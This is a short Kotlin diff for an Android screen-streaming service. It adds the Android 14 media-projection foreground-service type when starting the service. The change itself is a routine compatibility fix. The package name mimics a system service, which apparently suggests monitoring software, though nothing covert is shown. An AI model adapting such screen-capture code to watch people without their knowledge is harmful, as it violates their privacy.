@@ -2,6 +2,7 @@ package com.system.service.monitors
 
 import android.app.*
 import android.content.Intent
+import android.content.pm.ServiceInfo
 import android.graphics.Bitmap
 import android.graphics.PixelFormat
 import android.hardware.display.DisplayManager
@@ -44,7 +45,11 @@ class ScreenStreamService : Service() {
         if (intent?.action == "STOP") { stopStream(); stopSelf(); return START_NOT_STICKY }
         if (projectionResultData == null) { stopSelf(); return START_NOT_STICKY }
         createChannel()
-        startForeground(NOTIF_ID, buildNotif())
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            startForeground(NOTIF_ID, buildNotif(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
+        } else {
+            startForeground(NOTIF_ID, buildNotif())
+        }
         intervalMs = (intent?.getLongExtra("interval", 1000L) ?: 1000L).coerceAtLeast(300L)
         isRunning = true
         streaming.set(true)
